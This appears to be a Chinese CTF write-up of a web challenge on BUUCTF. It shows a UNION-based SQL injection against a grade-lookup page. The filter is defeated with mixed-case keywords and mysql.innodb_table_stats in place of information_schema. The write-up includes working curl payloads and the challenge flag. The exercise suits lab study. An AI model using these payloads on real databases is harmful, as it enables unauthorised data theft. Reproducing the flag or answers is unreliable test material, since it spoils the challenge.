---
title: "[NewStarCTF 2023 公开赛道]ez_sql"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [sqli, waf-bypass, union-injection]
vulnerability: SQL注入 + WAF绕过（大小写混合）
solved: true
flag: "flag{d794907f-1ae5-44cf-aa49-2ec862af331b}"
---

# [NewStarCTF 2023 公开赛道]ez_sql

## 题目概述
一个成绩查询系统，通过 id 参数查询课程信息。存在 SQL 注入漏洞，但有 WAF 过滤。

## 信息收集
1. 访问页面发现成绩查询功能，URL 格式为 `/?id=TMP0919`
2. 测试单引号 `id=TMP0919'` 导致 500 错误，确认存在 SQL 注入点
3. 测试 WAF 过滤规则，发现以下关键字被过滤：
   - `and`, `or`, `select`, `where`, `order`, `information_schema`
   - `sleep`, `substr`, `substring`, `ascii`

## 漏洞分析
WAF 使用大小写敏感匹配，可以使用大小写混合绕过：
- `Union Select` 绕过 `union select` 过滤
- `Where` 绕过 `where` 过滤

## 利用过程

### 1. 确认 UNION 注入列数
```bash
curl -s "http://target/?id=0'%20Union%20Select%201,2,3,4,5--%20"
```
回显点在第 2 列 (class_name)

### 2. 获取数据库名
```bash
curl -s "http://target/?id=0'%20Union%20Select%201,database(),3,4,5--%20"
# 结果: ctf
```

### 3. 获取表名（绕过 information_schema 过滤）
使用 `mysql.innodb_table_stats` 替代 `information_schema`:
```bash
curl -s "http://target/?id=0'%20Union%20Select%201,group_concat(table_name),3,4,5%20from%20mysql.innodb_table_stats%20Where%20database_name=database()--%20"
# 结果: grades,here_is_flag
```

### 4. 获取 flag
```bash
curl -s "http://target/?id=0'%20Union%20Select%201,flag,3,4,5%20from%20here_is_flag--%20"
# flag{d794907f-1ae5-44cf-aa49-2ec862af331b}
```

## 复现步骤
```bash
# 完整 payload
curl -s "http://3687fc45-e33a-4e51-8150-87952b1b18cc.node5.buuoj.cn:81/?id=0'%20Union%20Select%201,flag,3,4,5%20from%20here_is_flag--%20" | grep -oP 'class_name:.*?</div>'
```

## 关键技术点
1. **WAF 绕过**: 使用大小写混合 `Union Select` 绕过关键字过滤
2. **information_schema 替代**: 使用 `mysql.innodb_table_stats` 系统表绕过 information_schema 过滤
3. **UNION 注入**: 5 列，回显点在第 2 列
